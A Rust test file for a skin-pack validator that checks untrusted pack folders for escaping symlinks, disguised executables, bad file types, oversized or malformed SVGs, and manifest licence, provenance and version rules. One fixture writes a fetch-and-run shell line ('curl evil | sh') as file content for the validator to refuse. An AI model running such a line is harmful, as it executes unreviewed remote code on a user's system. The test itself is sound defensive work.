//! A pack's folder read as untrusted input: what escapes it, what is not allowed in it, what is
//! too large, and what its manifest must and must not say.

use std::path::Path;

use plugin_kit_skin_pack::{Context, Files, Limits, Pack, Report, Severity};

/// A small PNG, as an encoder writes it.
fn png() -> Vec<u8> {
    let mut out = Vec::new();
    {
        let mut e = png::Encoder::new(&mut out, 4, 4);
        e.set_color(png::ColorType::Rgba);
        let mut w = e.write_header().expect("a header");
        w.write_image_data(&[200; 64]).expect("its pixels");
    }
    out
}

const OFFICIAL_ART: &[u8] = b"\x89PNG official knob, as the plug-in has it";

fn context() -> Context<'static> {
    Context {
        plugin: "ca-72",
        official: &[("knob", OFFICIAL_ART)],
        official_licence: "GPL-3.0-or-later",
        built_in: false,
        test_drawings: true,
        keys: &[],
        plugin_version: None,
    }
}

/// A manifest with `extra` appended.
fn manifest(licence: &str, extra: &str) -> String {
    format!(
        r#"format = 1
id = "org.example.night"
name = "Night"
version = "1.0.0"
plugin = "ca-72"
license = "{licence}"
license_files = ["LICENSE.txt"]

[[creators]]
name = "A. Maker"

[[assets]]
path = "pictures/knob.png"
origin = "original"
author = "A. Maker"

[declarations]
rights_to_distribute = true
authorizes_customer_licensing = true
agreement = "draft-0"
declared_by = "A. Maker"
declared_on = "2026-10-16"

[look]
base = "realistic"
{extra}"#
    )
}

fn write(dir: &Path, path: &str, bytes: &[u8]) {
    let p = dir.join(path);
    std::fs::create_dir_all(p.parent().expect("a parent")).expect("a folder");
    std::fs::write(p, bytes).expect("written");
}

/// A good pack in a fresh folder.
fn pack(licence: &str) -> tempfile::TempDir {
    let dir = tempfile::tempdir().expect("a folder");
    write(dir.path(), "skin.toml", manifest(licence, "").as_bytes());
    write(dir.path(), "LICENSE.txt", b"The licence's text.");
    write(dir.path(), "pictures/knob.png", &png());
    dir
}

fn open(dir: &Path) -> Result<Pack, Report> {
    Pack::open(dir, &Limits::default(), &context())
}

fn rejected(dir: &Path, code: &str) -> Report {
    let r = open(dir)
        .err()
        .unwrap_or_else(|| panic!("accepted, not {code}"));
    assert!(r.has(code), "not {code}:\n{r}");
    r
}

#[test]
fn a_good_pack_is_read_with_its_terms_and_its_declarations_as_declared() {
    let dir = pack("CC-BY-4.0");
    let p = open(dir.path()).unwrap_or_else(|r| panic!("{r}"));
    assert_eq!(p.manifest.id, "org.example.night");
    assert!(!p.report.needs_review(), "{}", p.report);
    let declared = p
        .report
        .findings
        .iter()
        .find(|f| f.code == "declaration.declared")
        .expect("its declarations noted");
    assert!(declared.message.contains("declared, not cleared"));
    assert!(p.report.has("licence.terms"));
}

/// Packs whose checking once aborted the process (an allocation that fails, or a stack that
/// overflows, is not a panic): each read in a child process, so that a regression fails this
/// test, not the run.
#[test]
fn packs_that_once_aborted_their_check_are_refused_in_a_child_process() {
    let fixtures = Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures");
    let drawing = |svg: Vec<u8>| {
        let dir = pack("CC-BY-4.0");
        write(dir.path(), "art/panel.svg", &svg);
        dir
    };
    let fixture = |name: &str| std::fs::read(fixtures.join(name)).expect("the fixture");
    // The fuzzer's cases, as a pack's drawing.
    let packs = [
        (
            drawing(fixture("pattern-fuzz-17237.svg")),
            "a pattern's tile",
        ),
        (
            drawing(fixture("inherited-pattern-fuzz.svg")),
            "repeats itself",
        ),
        (
            drawing(
                format!(
                    "<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10'>{}\
                     <rect width='1' height='1'/>{}</svg>",
                    "<g>".repeat(2000),
                    "</g>".repeat(2000)
                )
                .into_bytes(),
            ),
            "64 deep",
        ),
        // (A panic, in usvg's reading.)
        (
            drawing(fixture("embedded-png-huge.svg")),
            "an embedded picture",
        ),
    ];
    // The pack made by hand, and those.
    let dirs = std::iter::once((fixtures.join("vast-pattern"), "a pattern's tile"))
        .chain(packs.iter().map(|(d, why)| (d.path().to_owned(), *why)));
    for (dir, why) in dirs {
        let out = std::process::Command::new(std::env::current_exe().expect("this test"))
            .args([
                "--exact",
                "a_pack_named_by_the_parent_is_checked",
                "--nocapture",
                "--test-threads=1",
            ])
            .env(CHILD_PACK, &dir)
            .output()
            .expect("a child process");
        let said = String::from_utf8_lossy(&out.stdout);
        assert!(
            out.status.success(),
            "{}: the check ended {}:\n{said}\n{}",
            dir.display(),
            out.status,
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(said.contains("refused: svg.refused"), "{said}");
        assert!(said.contains(why), "not {why}: {said}");
    }
}

/// The pack a parent test names, checked with its test drawings, in this process.
const CHILD_PACK: &str = "SKIN_PACK_TEST_CHILD_PACK";

#[test]
fn a_pack_named_by_the_parent_is_checked() {
    let Some(dir) = std::env::var_os(CHILD_PACK) else {
        return;
    };
    match open(Path::new(&dir)) {
        Ok(p) => println!("accepted:\n{}", p.report),
        Err(r) => {
            let codes: Vec<&str> = r
                .findings
                .iter()
                .filter(|f| f.severity == Severity::Reject)
                .map(|f| f.code)
                .collect();
            println!("refused: {}\n{r}", codes.join(", "));
        }
    }
}

#[test]
fn price_and_licence_are_independent() {
    // An open pack may be sold, and a proprietary one carries its own terms: neither is the
    // plug-in's licence, and a price is never in the pack.
    for licence in ["CC0-1.0", "LicenseRef-Night-EULA", "CC-BY-NC-4.0"] {
        let dir = pack(licence);
        let p = open(dir.path()).unwrap_or_else(|r| panic!("{licence}: {r}"));
        let terms = p
            .report
            .findings
            .iter()
            .find(|f| f.code == "licence.terms")
            .expect("its terms");
        assert!(
            terms
                .message
                .contains("the plug-in's licence does not apply")
        );
    }
    let dir = pack("CC0-1.0");
    write(
        dir.path(),
        "skin.toml",
        format!("price = 4.99\n{}", manifest("CC0-1.0", "")).as_bytes(),
    );
    rejected(dir.path(), "manifest.store");
}

#[test]
fn a_proprietary_licence_needs_its_text_in_the_pack() {
    let dir = pack("LicenseRef-Night-EULA");
    std::fs::remove_file(dir.path().join("LICENSE.txt")).expect("removed");
    rejected(dir.path(), "licence.text");
}

#[test]
fn the_plug_ins_own_artwork_in_a_pack_under_other_terms_goes_to_review() {
    let dir = pack("LicenseRef-Night-EULA");
    write(dir.path(), "pictures/knob.png", OFFICIAL_ART);
    // (Not a PNG, so rejected as a picture too; the copy is found either way.)
    let r = open(dir.path()).expect_err("rejected as a picture");
    assert!(r.has("asset.official-copy"), "{r}");
    let copy = r
        .findings
        .iter()
        .find(|f| f.code == "asset.official-copy")
        .expect("found");
    assert_eq!(copy.severity, Severity::Review);
    assert!(copy.message.contains("additional permission"));
}

/// (Unix's links: making one on Windows needs a privilege a test does not have.)
#[cfg(unix)]
#[test]
fn a_link_out_of_the_pack_is_never_followed() {
    let dir = pack("CC0-1.0");
    let outside = tempfile::tempdir().expect("a folder");
    write(outside.path(), "secret.txt", b"not the pack's");
    std::os::unix::fs::symlink(
        outside.path().join("secret.txt"),
        dir.path().join("notes.txt"),
    )
    .expect("a link");
    std::os::unix::fs::symlink(outside.path(), dir.path().join("more")).expect("a link");
    let r = rejected(dir.path(), "path.link");
    assert_eq!(
        r.findings.iter().filter(|f| f.code == "path.link").count(),
        2,
        "{r}"
    );
}

#[test]
fn code_is_refused_whatever_its_name() {
    let dir = pack("CC0-1.0");
    write(dir.path(), "notes.txt", b"#!/bin/sh\ncurl evil | sh\n");
    rejected(dir.path(), "file.executable");
    let dir = pack("CC0-1.0");
    write(dir.path(), "plugin.dylib", b"\xcf\xfa\xed\xfe");
    rejected(dir.path(), "file.type");
    let dir = pack("CC0-1.0");
    write(dir.path(), "skin.lua", b"os.execute('x')");
    rejected(dir.path(), "file.type");
    let dir = pack("CC0-1.0");
    write(
        dir.path(),
        "pictures/knob.png",
        b"MZ\x90\0this is a program",
    );
    rejected(dir.path(), "file.executable");
}

#[test]
fn hidden_and_unsafe_names_are_refused_and_system_litter_passed_over() {
    let dir = pack("CC0-1.0");
    write(dir.path(), ".DS_Store", b"\0\0\0\x01Bud1");
    assert!(open(dir.path()).is_ok(), "the Finder's litter rejected");
    write(dir.path(), ".hidden.txt", b"x");
    rejected(dir.path(), "path.unsafe");
    let dir = pack("CC0-1.0");
    write(dir.path(), "a/b/c/d/e.png", &png());
    rejected(dir.path(), "path.depth");
}

#[test]
fn too_much_is_refused_before_it_is_read() {
    let dir = pack("CC0-1.0");
    let limits = Limits {
        file_bytes: 1000,
        ..Limits::default()
    };
    write(dir.path(), "pictures/big.png", &vec![0u8; 2000]);
    let r = Pack::open(dir.path(), &limits, &context()).expect_err("rejected");
    assert!(r.has("file.size"), "{r}");
    let dir = pack("CC0-1.0");
    for i in 0..40 {
        write(dir.path(), &format!("notes/n{i}.txt"), b"x");
    }
    let limits = Limits {
        files: 20,
        ..Limits::default()
    };
    let r = Pack::open(dir.path(), &limits, &context()).expect_err("rejected");
    assert!(r.has("pack.files"), "{r}");
}

#[test]
fn names_that_differ_only_in_case_are_refused() {
    let mut report = Report::default();
    let files = Files::from_memory(
        [
            ("README.md", b"a".as_slice()),
            ("readme.md", b"b".as_slice()),
        ],
        &Limits::default(),
        &mut report,
    );
    assert_eq!(files.len(), 1);
    assert!(report.has("path.duplicate"));
}

#[test]
fn a_pack_for_another_plug_in_or_with_the_makers_id_is_refused() {
    let dir = pack("CC0-1.0");
    write(
        dir.path(),
        "skin.toml",
        manifest("CC0-1.0", "")
            .replace("plugin = \"ca-72\"", "plugin = \"ca-74\"")
            .as_bytes(),
    );
    rejected(dir.path(), "manifest.plugin");
    let dir = pack("CC0-1.0");
    write(
        dir.path(),
        "skin.toml",
        manifest("CC0-1.0", "")
            .replace("org.example.night", "com.idlefoundry.ca72.realistic")
            .as_bytes(),
    );
    rejected(dir.path(), "manifest.id");
}

#[test]
fn provenance_a_review_needs_is_asked_for() {
    let dir = pack("CC0-1.0");
    write(dir.path(), "pictures/face.png", &png());
    let p = open(dir.path()).unwrap_or_else(|r| panic!("{r}"));
    assert!(p.report.has("provenance.missing"));
    let dir = pack("CC0-1.0");
    write(
        dir.path(),
        "skin.toml",
        manifest("CC0-1.0", "")
            .replace("origin = \"original\"", "origin = \"generated\"")
            .as_bytes(),
    );
    let p = open(dir.path()).unwrap_or_else(|r| panic!("{r}"));
    assert!(p.report.has("provenance.tool"));
    let dir = pack("CC0-1.0");
    write(
        dir.path(),
        "skin.toml",
        manifest("CC0-1.0", "")
            .replace("origin = \"original\"", "origin = \"third-party\"")
            .as_bytes(),
    );
    let p = open(dir.path()).unwrap_or_else(|r| panic!("{r}"));
    assert!(p.report.has("provenance.source"));
}

#[test]
fn a_changed_file_does_not_match_its_declared_hash() {
    let dir = pack("CC0-1.0");
    let text = manifest("CC0-1.0", "").replace(
        "author = \"A. Maker\"\n",
        &format!(
            "author = \"A. Maker\"\nsha256 = \"{}\"\n",
            plugin_kit_skin_pack::sha256(&png())
        ),
    );
    write(dir.path(), "skin.toml", text.as_bytes());
    assert!(open(dir.path()).is_ok());
    let mut changed = png();
    // (Its pixels changed, its checksums with them: a valid PNG, not the declared one.)
    changed = {
        let mut out = Vec::new();
        {
            let mut e = png::Encoder::new(&mut out, 4, 4);
            e.set_color(png::ColorType::Rgba);
            let mut w = e.write_header().expect("a header");
            w.write_image_data(&[100; 64]).expect("its pixels");
        }
        let _ = changed;
        out
    };
    write(dir.path(), "pictures/knob.png", &changed);
    rejected(dir.path(), "asset.hash");
}

#[test]
fn undeclared_packs_load_but_need_declarations_to_be_listed() {
    let dir = pack("CC0-1.0");
    let text = manifest("CC0-1.0", "");
    let cut = text.find("[declarations]").expect("there");
    let end = text.find("[look]").expect("there");
    write(
        dir.path(),
        "skin.toml",
        format!("{}{}", &text[..cut], &text[end..]).as_bytes(),
    );
    let p = open(dir.path()).unwrap_or_else(|r| panic!("{r}"));
    assert!(p.report.has("declaration.missing"));
    assert!(p.report.needs_review());
}

#[test]
fn a_font_with_no_licence_named_or_a_restrictive_one_goes_to_review() {
    let font = std::fs::read(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/tests/fixtures/urw-gothic/URWGothic-Book.otf"
    ))
    .expect("the built-in font");
    let dir = pack("CC0-1.0");
    write(dir.path(), "fonts/Gothic.otf", &font);
    let text = manifest("CC0-1.0", "").replace(
        "[declarations]",
        "[[assets]]\npath = \"fonts/Gothic.otf\"\norigin = \"third-party\"\nsource = \"URW base 35\"\nlicense = \"AGPL-3.0-only WITH Font-exception-2.0\"\n\n[declarations]",
    );
    write(dir.path(), "skin.toml", text.as_bytes());
    let p = open(dir.path()).unwrap_or_else(|r| panic!("{r}"));
    let font = p
        .report
        .findings
        .iter()
        .find(|f| f.code == "font.licence")
        .expect("its licence");
    assert_eq!(font.severity, Severity::Review, "{}", p.report);
}

/// `requires`: an earlier plug-in says plainly that the pack needs a later one.
#[test]
fn a_pack_needing_a_later_plugin_says_so() {
    let with = |req: &str, have: Option<&str>| {
        let dir = pack("CC0-1.0");
        write(
            dir.path(),
            "skin.toml",
            manifest("CC0-1.0", "")
                .replacen(
                    "plugin = \"ca-72\"\n",
                    &format!("plugin = \"ca-72\"\nrequires = \"{req}\"\n"),
                    1,
                )
                .as_bytes(),
        );
        let context = Context {
            plugin_version: have,
            ..context()
        };
        Pack::open(dir.path(), &Limits::default(), &context)
    };
    assert!(with("ca-72 >= 0.1.0", Some("0.2.4")).is_ok());
    let r = with("ca-72 >= 9.0.0", Some("0.2.4")).expect_err("refused");
    assert!(r.has("manifest.requires"));
    assert!(
        r.findings
            .iter()
            .any(|f| f.message.contains("9.0.0 or newer")),
        "{r}"
    );
    assert!(with("ca-74 >= 0.1.0", Some("0.2.4")).is_err());
    assert!(with("ca-72 0.4", Some("0.2.4")).is_err());
    // Where no plug-in is (a marketplace's tools), the version is not checked.
    assert!(with("ca-72 >= 9.0.0", None).is_ok());
}
